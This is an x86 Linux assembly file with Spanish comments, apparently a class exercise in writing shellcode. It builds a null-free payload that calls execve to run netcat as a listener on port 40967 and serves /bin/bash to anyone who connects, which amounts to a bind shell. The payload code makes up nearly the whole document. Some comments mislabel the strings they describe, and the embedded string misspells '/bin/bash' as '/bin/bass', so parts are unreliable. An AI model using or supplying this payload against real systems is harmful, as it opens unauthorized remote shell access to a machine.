;;; Les comento: basado en el programa visto en clase defini la siguiente cadena:
	
;;; /bin/ncN-lvvpN40967N-eN/bin/bassNXXXXXXXXXXXXXXXXXXXXYYYYTERM=linuxNXXXXYYYY
	
;;; en donde cada N se substuye con un cero mediante la asignacion del registro al (limpiado con un xor a si mismo).
;;; Los grupos de Y's corresponden a una doble palabra (dword) y simbolizan el final de un arreglo de apuntadores a cadenas (cada una de ellas terminadas con un valor cero), por ello se les asigna el valor 0.
;;; Los grupos de cuatro X's corresponden a una direccion de memoria, la direccion de memoria donde esta definida cada una de las cadenas del arreglo de apuntadores a cadena, como esta especificado en la llamada de sistema execve.
	
	;; prog3.asm
	global _start
	section .text

_start:
	jmp dir_cadena
codigo:
	pop esi			;almacena en el registro ESI, el valor inicial de la pila

	xor eax,eax	    ;EAX=0
	mov byte[esi+7],al	;Fin de cadena de '/bin/sh'
	mov byte[esi+13],al	;Fin de cadena de '-lvvp'
	mov byte[esi+19],al	;Fin de cadena de '40967'
	mov byte[esi+22],al	;Fin de cadena de '-e'
	mov byte[esi+32],al	;Fin de cadena de '/bin/bash'
	mov dword[esi+53],eax	;Fin del arreglo de apuntadores a cadena (2do parametro de la syscall execve)
	
	mov byte[esi+67],al	;Fin de cadena de 'TERM=linux'
	mov dword[esi+72],eax	;Fin del arreglo de apuntadores a cadena (3er parametro de la syscall execve)

	lea ebx,[esi]		
	mov [esi+33],ebx	;Guarda la direccion del primer parametro (/bin/sh)
	lea ebx,[esi+8]
	mov [esi+37],ebx	;Guarda la direccion del segundo parametro (-lvvp)
	lea ebx,[esi+14]
	mov [esi+41],ebx	;Guarda la direccion del tercer parametro (40967)
	lea ebx,[esi+20]
	mov [esi+45],ebx	;Guarda la direccion del tercer parametro (-e)
	lea ebx,[esi+23]
	mov [esi+49],ebx	;Guarda la direccion del tercer parametro (/bin/sh)

	lea ebx,[esi+57]
	mov [esi+68],ebx	;Guarda la direccion de al primer variable de ambiente (PATH)

	
	lea ebx,[esi]
	lea ecx,[esi+33]	;ECX tiene el arreglo de parametros
	lea edx,[esi+68]	;EDX tiene el arreglo de variables de ambiente
	mov al,0xb		;syscall execve
	int 0x80
	
dir_cadena:	
	call codigo		;guarda la direccion inicial de la cadena en la pila
	db '/bin/ncN-lvvpN40967N-eN/bin/bassNXXXXXXXXXXXXXXXXXXXXYYYYTERM=linuxNXXXXYYYY'
	
